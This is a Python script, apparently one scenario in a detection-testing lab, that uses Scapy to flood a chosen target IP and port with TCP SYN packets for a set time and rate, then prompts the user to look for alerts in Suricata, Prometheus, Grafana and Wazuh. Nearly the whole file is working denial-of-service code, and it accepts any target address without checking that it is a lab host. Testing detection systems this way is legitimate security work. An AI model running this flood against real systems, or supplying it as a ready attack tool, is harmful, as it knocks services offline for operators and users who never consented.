#!/usr/bin/env python3
"""
Scenario 1: SYN Flood Attack (TCP Half-Open Connections)
- Difficulty: Beginner
- Detection: Suricata, Prometheus, Wazuh
- Expected Alert: DoS/DDoS pattern detection
"""

import sys
import argparse
import logging
import time
from scapy.all import IP, TCP, send, RandShort, conf
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Disable Scapy warnings
conf.verbose = False

class SYNFloodScenario:
    def __init__(self, target, port=80, duration=30, intensity=5, verbose=False):
        self.target = target
        self.port = port
        self.duration = duration
        self.intensity = intensity  # 1-10 scale
        self.verbose = verbose
        self.packet_count = 0
        self.start_time = None
        self.results = {
            'scenario': 'SYN_FLOOD',
            'target': target,
            'port': port,
            'duration': duration,
            'packets_sent': 0,
            'pps': 0,  # packets per second
            'status': 'pending'
        }

    def generate_packets(self):
        """Generate SYN flood packets"""
        packets_per_second = 100 * self.intensity  # 500-1000 PPS at intensity 5-10
        delay = 1.0 / packets_per_second if packets_per_second > 0 else 0

        logger.info(f"[*] Starting SYN Flood against {self.target}:{self.port}")
        logger.info(f"[*] Duration: {self.duration}s | Intensity: {self.intensity}/10 ({packets_per_second} PPS)")

        self.start_time = time.time()
        elapsed = 0

        try:
            while elapsed < self.duration:
                # Create SYN packet with random source port and sequence number
                pkt = IP(dst=self.target) / TCP(
                    dport=self.port,
                    sport=RandShort(),
                    flags="S",  # SYN flag
                    seq=RandShort()
                )

                try:
                    send(pkt, verbose=0)
                    self.packet_count += 1

                    if self.verbose and self.packet_count % 100 == 0:
                        logger.info(f"[+] Sent {self.packet_count} packets...")

                    time.sleep(delay)
                except Exception as e:
                    if self.verbose:
                        logger.warning(f"[-] Error sending packet: {e}")

                elapsed = time.time() - self.start_time

        except KeyboardInterrupt:
            logger.info("\n[!] Attack interrupted by user")
        except Exception as e:
            logger.error(f"[-] Attack failed: {e}")
            self.results['status'] = 'failed'
            return

        self.results['packets_sent'] = self.packet_count
        self.results['pps'] = self.packet_count / self.duration if self.duration > 0 else 0
        self.results['status'] = 'completed'
        self.log_results()

    def log_results(self):
        """Log scenario results"""
        logger.info("\n" + "="*60)
        logger.info("SYN FLOOD ATTACK RESULTS")
        logger.info("="*60)
        logger.info(f"Target: {self.target}:{self.port}")
        logger.info(f"Duration: {self.duration} seconds")
        logger.info(f"Total Packets Sent: {self.packet_count}")
        logger.info(f"Packets Per Second (PPS): {self.results['pps']:.2f}")
        logger.info(f"Status: {self.results['status'].upper()}")
        logger.info("="*60)
        logger.info("\n[!] Check Monitoring Systems:")
        logger.info("  - Suricata: Look for DoS/DDoS alerts")
        logger.info("  - Prometheus: Monitor tcp_connections spike")
        logger.info("  - Grafana: Check Network Traffic dashboard")
        logger.info("  - Wazuh: Search for 'SYN' or 'flood' in alerts")
        logger.info("="*60 + "\n")

def main():
    parser = argparse.ArgumentParser(
        description='SYN Flood Attack Scenario',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python 01_syn_flood.py --target 10.10.10.10 --duration 30
  python 01_syn_flood.py --target 192.168.1.100 --port 443 --intensity 8 --verbose
        '''
    )

    parser.add_argument('--target', required=True, help='Target IP address')
    parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--duration', type=int, default=30, help='Attack duration in seconds (default: 30)')
    parser.add_argument('--intensity', type=int, default=5, help='Attack intensity 1-10 (default: 5)')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')

    args = parser.parse_args()

    # Validate inputs
    if not 1 <= args.intensity <= 10:
        logger.error("[-] Intensity must be between 1-10")
        sys.exit(1)

    if args.duration < 1:
        logger.error("[-] Duration must be at least 1 second")
        sys.exit(1)

    # Run scenario
    scenario = SYNFloodScenario(
        target=args.target,
        port=args.port,
        duration=args.duration,
        intensity=args.intensity,
        verbose=args.verbose
    )

    scenario.generate_packets()

if __name__ == '__main__':
    main()